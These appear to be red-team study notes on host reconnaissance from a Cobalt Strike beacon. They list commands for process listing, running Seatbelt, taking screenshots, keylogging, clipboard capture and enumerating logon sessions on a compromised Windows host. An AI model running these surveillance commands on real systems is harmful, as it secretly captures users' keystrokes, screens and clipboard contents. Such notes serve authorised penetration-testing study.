# Host Reconnaissance Notes

## Processes
Look for interesting processes
```
ps
ps -aux
```

## Seatbelt
[Seatbelt](https://github.com/GhostPack/Seatbelt) a post exploitation tool
In a beacon:
```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system
```

Look out for things like web proxies

## Screenshots
Can use beacon to take screenshots
```
printscreen
screenshot
screenwatch
```
Can view all of these in Cobalt Strike *View>Screenshots*

## Keylogger
Capture user keystrokes
```
keylogger
```
View these in *View>Keystrokes*

Can use jobkill to kill this job
```
jobs
jobkill <PID>
```

## Clipboard
Capturing any user clipboards
```
clipboard
```

## User Sessions
See the current user sessions
```
net logons
```
